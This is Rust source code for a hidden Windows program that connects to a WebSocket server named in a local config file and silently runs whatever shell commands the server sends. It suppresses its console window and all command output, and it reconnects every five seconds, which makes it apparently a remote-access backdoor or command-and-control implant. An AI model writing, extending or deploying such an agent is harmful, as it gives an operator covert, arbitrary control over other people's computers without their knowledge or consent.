#![windows_subsystem = "windows"]

use tokio_tungstenite::tungstenite::protocol::Message;
use tokio_tungstenite::connect_async;
use tokio_tungstenite::WebSocketStream;
use std::process::{Command, Stdio};
use std::os::windows::process::CommandExt;
use tokio::time::{sleep, Duration};
use futures_util::stream::StreamExt;
use futures_util::sink::SinkExt;
use serde_json::json;
use serde_json::Value;
use std::fs;
use winapi::um::winbase::CREATE_NO_WINDOW;

async fn send_response<T>(
    write: &mut futures_util::stream::SplitSink<WebSocketStream<T>, tokio_tungstenite::tungstenite::protocol::Message>,
    message: &str,
    id: i32,
) -> Result<(), tokio_tungstenite::tungstenite::Error>
where
    T: tokio::io::AsyncWrite + tokio::io::AsyncRead + Unpin,
{
    let response = json!({ "result": message, "id": id });
    let response_text = response.to_string();
    write.send(tokio_tungstenite::tungstenite::protocol::Message::Text(response_text)).await?;
    Ok(())
}

fn load_url_from_json() -> Option<String> {
    let file_path = std::env::current_exe().unwrap().parent().unwrap().join("variables.json");

    match fs::read_to_string(file_path) {
        Ok(content) => {
            match serde_json::from_str::<Value>(&content) {
                Ok(json) => json["ws-server-url"].as_str().map(|s| s.to_string()),
                Err(e) => {
                    eprintln!("Ошибка парсинга JSON: {}", e);
                    None
                }
            }
        }
        Err(e) => {
            eprintln!("Ошибка чтения файла: {}", e);
            None
        }
    }
}

async fn handle_message<T>(
    write: &mut futures_util::stream::SplitSink<WebSocketStream<T>, tokio_tungstenite::tungstenite::protocol::Message>,
    msg: Message,
) where
    T: tokio::io::AsyncWrite + tokio::io::AsyncRead + Unpin,
{
    if let Message::Text(text) = msg {
        println!("Получено сообщение: {}", text);
        match serde_json::from_str::<Value>(&text) {
            Ok(json_msg) => {
                if let (Some(command), Some(id)) = (json_msg["command"].as_str(), json_msg["id"].as_i64()) {
                    println!("Команда: {}, ID: {}", command, id);
                    match command {
                        "ping" => {
                            let response_msg = "rust-pong";
                            if let Err(e) = send_response(write, response_msg, id as i32).await {
                                eprintln!("Ошибка отправки ответа: {}", e);
                                return;
                            }
                        }
                        "stop" => {
                            let response_msg = "";
                            if let Err(e) = send_response(write, response_msg, id as i32).await {
                                eprintln!("Ошибка отправки ответа: {}", e);
                                return;
                            }
                            std::process::exit(0);
                        }
                        _ => {
                            let response_msg: &str = "";
                            if let Err(e) = send_response(write, response_msg, id as i32).await {
                                eprintln!("Ошибка отправки ответа: {}", e);
                                return;
                            }
                        
                            if let Ok(mut child) = Command::new("cmd")
                                .args(&["/C", command])
                                .creation_flags(CREATE_NO_WINDOW)
                                .stdin(Stdio::null())
                                .stdout(Stdio::null())
                                .stderr(Stdio::null())
                                .spawn()
                            {
                                let _ = child.wait();
                            } else {
                                eprintln!("Ошибка выполнения команды: {}", command);
                            }
                        }
                    }
                } else {
                    eprintln!("Неправильный формат команды или отсутствует ID.");
                }
            }
            Err(e) => {
                eprintln!("Ошибка парсинга сообщения: {}", e);
            }
        }
    }
}

async fn connect_and_run(url: String) {
    loop {
        println!("Подключение к {}", url);
        match connect_async(url.clone()).await {
            Ok((ws_stream, _)) => {
                println!("Подключение установлено.");
                let (mut write, mut read) = ws_stream.split();

                while let Some(msg) = read.next().await {
                    match msg {
                        Ok(message) => handle_message(&mut write, message).await,
                        Err(e) => {
                            eprintln!("Ошибка получения сообщения: {}", e);
                            break;
                        }
                    }
                }
            }
            Err(e) => {
                eprintln!("Ошибка подключения: {}", e);
            }
        }
        println!("Переподключение через 5 секунд...");
        sleep(Duration::from_secs(5)).await;
    }
}

#[tokio::main]
async fn main() {
    println!("Запуск приложения...");
    match load_url_from_json() {
        Some(url) => connect_and_run(url).await,
        None => eprintln!("Unable to load URL. Exiting..."),
    }
}
